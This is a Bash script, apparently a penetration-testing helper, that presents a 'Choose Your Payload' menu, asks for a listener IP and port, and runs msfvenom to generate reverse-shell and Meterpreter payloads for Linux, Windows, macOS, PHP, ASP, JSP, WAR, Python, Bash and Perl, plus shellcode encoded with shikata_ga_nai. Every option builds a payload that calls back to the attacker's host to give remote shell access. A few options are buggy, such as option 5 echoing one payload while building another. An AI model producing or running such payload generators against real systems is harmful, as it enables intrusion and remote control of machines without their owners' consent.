#!/bin/bash


function header()
{

  echo " ****************************************************** "
  echo " *						      * "
  echo " *						      * "
  echo " *	C H O O S E  Y O U R  P A Y L O A D	      * "
  echo " *						      * "
  echo " *						      * "
  echo " ****************************************************** "
  echo " "

  echo -e " \e[32m This Script is based in the info on the web NETSEC  https://netsec.ws/?p=331 "
  echo " "
  echo " "
  echo "Scripted by Flynn"
}


function hostport
{

  clear
  header
  echo -e "\e[36m"
  read -p "Enter the IP for your Localhost : " lh
  read -p "Enter your Local Port : " lp
}

function menu
{

  header
  echo -e "\e[33m"
  echo ".0 Exit "
  echo " "
  echo " "

  echo " - BINARY PAYLOADS -"
  echo " "
  echo " 1. Linux "
  echo "  1.1. Payload for Linux Exploits"
  echo " 2. Windows"
  echo "  2.1. Payload for Windows Exploits"
  echo " 3. Mac "
  echo " "

  echo  " - WEB PAYLOADS - "
  echo " "
  echo " 4. PHP "
  echo " 5. ASP "
  echo " 6. JSP "
  echo " 7. WAR "
  echo " "

  echo " - SCRIPTING PAYLOAD "
  echo " "
  echo " 8. Python "
  echo " 9. Bash "
  echo " 10. Perl "
  echo " "

  echo " - SHELLCODE "
  echo " "
  echo " 11. Linux  "
  echo " 12. Windows "
  echo " "
  echo " "

  
}


### OPTION 1 ###

function one
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= "$lh "LPORT= "$lp " -f elf > shell.elf "
 echo " "
 echo " "

    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f elf > shell.elf 
    ls *.elf
}



## OPTION 1.1

function onedotone
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo " "
 echo "msfvenom -p linux/x86/shell_bind_tcp LHOST="$lh "LPORT="$lp "-f c -b \x00\x0a\x0d\x20 –e x86/shikata_ga_nai"
 echo " "

    msfvenom -p linux/x86/shell_bind_tcp LHOST=$lh LPORT=$lp -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
}




### OPTION 2 ###

function two
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST= "$lh "LPORT= "$lp " -f exe > shell.exe "
 echo " "
 echo " "

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp  -f exe > shell.exe
    ls *.exe
}



## OPTION 2.1

function twodotone
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo " "
 echo "msfvenom -p windows/shell_reverse_tcp LHOST=$lh LPORT=$lp -f c –e x86/shikata_ga_nai -b \x00\x0a\x0d"
 echo " "

    msfvenom -p windows/shell_reverse_tcp LHOST=$lh LPORT=$lp -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
}




### OPTION 3 ###

function three
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p osx/x86/shell_reverse_tcp LHOST= "$lh "LPORT= "$lp " -f macho > shell.macho "
 echo " "
 echo " "

    msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lh LPORT=$lp  -f macho > shell.macho
    ls *.macho
}




### OPTION 4 ###

function four
{
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p php/meterpreter_reverse_tcp LHOST= "$lh "LPORT= "$lp "-f raw > shell.php"
 echo " "
 echo " "

    msfvenom -p php/meterpreter_reverse_tcp LHOST=$lh LPORT=$lp -f raw > shell.php
    ls *.php
}





### OPTION 5 ###

function five
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST= "$lh "LPORT= "$lp "-f asp > shell.asp"
 echo " "
 echo " "

    msfvenom -p php/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f asp > shell.asp 
    ls *.asp
}




### OPTION 6 ###

function six
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST= "$lh "LPORT= "$lp "-f raw  > shell.jsp"
 echo " "
 echo " "

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lh LPORT=$lp -f raw  > shell.jsp
    ls *.jsp
}



### OPTION 7 ###

function seven
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST="$lh "LPORT="$lp "-f war  > shell.war"
 echo " "
 echo " "

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lh LPORT=$lp -f war > shell.war
    ls *.war
}



### OPTION 8 ###

function eight
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p cmd/unix/reverse_python LHOST= "$lh "LPORT= "$lp "-f raw > shell.py"
 echo " "
 echo " "

    msfvenom -p cmd/unix/reverse_python LHOST=$lh LPORT=$lp -f raw > shell.py
    ls *.py
}



#### OPTION 9 ###

function nine
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p cmd/unix/reverse_bash LHOST= "$lh "LPORT= "$lp "-f raw > shell.sh"
 echo " "
 echo " "

    msfvenom -p cmd/unix/reverse_bash LHOST= $lh LPORT= $lp -f raw > shell.sh
    ls *.sh
}





#### OPTION 10 ###

function ten
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -p cmd/unix/reverse_perl LHOST= "$lh "LPORT= "$lp "-f raw > shell.perl"
 echo " "
 echo " "

    msfvenom -p cmd/unix/reverse_perl LHOST=$lh LPORT=$lp -f raw > shell.perl
    ls *.sh
}



#### OPTION 11 ###

function eleven
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST= "$lh "LPORT= "$lp "-b \x00 -f elf > shell.elf"
 echo " "
 echo " "

    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=$lh LPORT=$lp -b "\x00" -f elf > shellbash.elf
    ls *.sh
}




#### OPTION 12 ###

function twelve
{
 
 hostport
 shellfolder=$(pwd 2>&1)
 echo " "
 echo "Your shell will be created in the folder : " $shellfolder
 echo " "
 echo "msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST="$lh "LPORT="$lp "-b "\x00" -e x86/shikata_ga_nai -f exe > shellwin.exe"
 echo " "
 echo " "

     msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lh LPORT=$lp -b "\x00" -e x86/shikata_ga_nai -f exe > shellwin.exe
     ls *.exe
}




menu
read -p "Choose the option: "  opt
case $opt in
     0) exit ;;
     1) one  ;;
     1.1) onedotone ;;
     2) two  ;;
     2.1) twodotone ;;
     3) three  ;;
     4) four   ;;
     5) five ;;
     6) six ;;
     7) seven ;;
     8) eight ;;
     9) nine ;;
     10) ten ;;
     11) eleven  ;;
     12) twelve  ;;
     *)  clear ; echo "BYE!!"
esac
